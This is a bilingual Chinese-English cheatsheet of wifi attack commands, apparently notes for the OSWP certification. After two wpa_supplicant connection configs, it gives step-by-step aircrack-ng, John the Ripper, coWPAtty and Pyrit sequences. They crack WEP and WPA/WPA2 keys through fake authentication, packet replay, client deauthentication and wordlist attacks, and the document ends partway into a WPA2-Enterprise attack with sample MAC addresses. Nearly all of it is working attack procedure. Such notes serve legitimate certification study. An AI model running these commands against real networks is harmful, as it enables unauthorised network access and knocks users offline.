All honour to this [cheatsheet](https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html#wep-cracking)

# 连接wifi

## PSK
wifi.conf
```
network={
	ssid="<NetworkName>"
	scan_ssid=1
	psk="<password>"
	key_mgmt=WPA-PSK
}
```


## 企业版
wifi.conf
```
network={
	ssid="<NetworkName>"
	scan_ssid=1
	key_mgmt=WPA-EAP
	identity="<Domain\username>"
	password="<password>"
	eap=PEAP
	phase1="peaplabel=0"
	phase2="auth=MSCHAPV2"
}
```

连接
```
sudo wpa_supplicant -i <INTERFACE> -c <wifi-config>
```


# WEP

## crack
```
# 启动监控模式
airmon-ng start <INTERFACE>

# 数据包捕获
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address(获取您的 MAC 地址)
macchanger --show <INTERFACE>

# Fake authentication attack(伪造身份验证攻击)
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# ARP replay attack(ARP 重放攻击)
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>

# Deauthentication attack(取消身份验证攻击)
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack (破解)
aircrack-ng <CAPTURE_NAME>

# Dictionnary attack(字典攻击)
aircrack-ng -w <PASSWORDS_WORDLIST> <CAPTURE_NAME>
```

## Cracking WEP via a Client

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Get your MAC address
macchanger --show <INTERFACE>

# Fake authentication attack(伪造身份验证攻击)
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>

# Interactive packet replay attack(交互式数据包重放攻击)
aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <INTERFACE>

or

# Interactive packet replay attack with a capture file(利用捕获文件进行交互式数据包重放攻击)
aireplay-ng -2 -r replay_src-<FILE_NAME>.cap <INTERFACE>

# Crack  (破解)
aircrack-ng <CAPTURE_NAME>

# Dictionnary attack(字典攻击)
aircrack-ng -w <PASSWORDS_WORDLIST> <CAPTURE_NAME>
```


# WPA/WPA2 CRACKING

## Cracking WPA/WPA2 PSK with Aircrack-ng
```
# Start monitor mode(开启监听)
airmon-ng start <INTERFACE>

# Packet capture（数据包捕获）
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack（取消身份验证攻击）
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack 
aircrack-ng <CAPTURE_NAME> -w <PASSWORDS_WORDLIST>
```

## Cracking WPA with John The Ripper and Aircrack-ng

```
# Start monitor mode(开启监听)
airmon-ng start <INTERFACE>

# Packet capture（数据包捕获）
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack（取消身份验证攻击）
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack with john(使用jhon破解)
john -wordlist=<PASSWORDS_WORDLIST> --rules -stdout | aircrack-ng -0 -e <ESSID> -w - <CAPTURE_NAME>

or

# Capture to .hccap
aircrack-ng <CAPTURE_NAME> -J john_out

# .hccap to john syntax 
hccap2john john_out.hccap > out

# Crack with john
john -wordlist=<PASSWORDS_WORDLIST> --rules out
```

## Cracking WPA with coWPAtty

```
# Start monitor mode(开启监听)
airmon-ng start <INTERFACE>

# Packet capture（数据包捕获）
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack（取消身份验证攻击）
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# coWPAtty needs a full valid handshake, check if it can use it(coWPAtty 需要完全有效的握手，请检查是否可以使用它)
cowpatty -r <CAPTURE_NAME> -c

## IF the handshake is full you can continue ##
## ELSE crack it with aircrack-ng

# Crack (slow better use aircrack-ng)
cowpatty -r <CAPTURE_NAME> -f <PASSWORDS_WORDLIST> -s <SSID>

# Generate hashes for the specific SSID (Slow to generate)
genpmk -s <SSID> -f <PASSWORDS_WORDLIST> -d <HASHES_FILENAME>

# Crack (Very fast)
cowpatty -r <PASSWORDS_WORDLIST> -d <HASHES_FILENAME> -s <SSID>
```

## Cracking WPA with Pyrit

```
# Start monitor mode
airmon-ng start <INTERFACE>

# Packet capture
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>

# Deauthentication attack
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>

# Crack (slow better use aircrack-ng)
pyrit -r <CAPTURE_NAME> -b <BSSID> -i <PASSWORDS_WORDLIST> attack_passthrough

or

# Import passwords list
pyrit -i <PASSWORDS_WORDLIST> import_passwords

# Import ESSID in database
pyrit -e <ESSID> create_essid

# Generate hashes for the specific SSID (Slow to generate, but faster than coWPAtty)
pyrit batch

# Crack (Very fast)
pyrit -r <CAPTURE_NAME> attack_db
```

# Attacking WPA2-Enterprise

参考：
[oswp_notes](https://github.com/drewlong/oswp_notes)


1. 监听

```
sudo airodump-ng wlan0
```

2. 抓包
```
sudo airodump-ng wlan0 -c 6 -w mgt
```

3. 去除验证
```
sudo aireplay-ng -0 0 -a 02:13:37:BE:EF:03 -c 1E:E2:96:77:53:C1 wlan0
```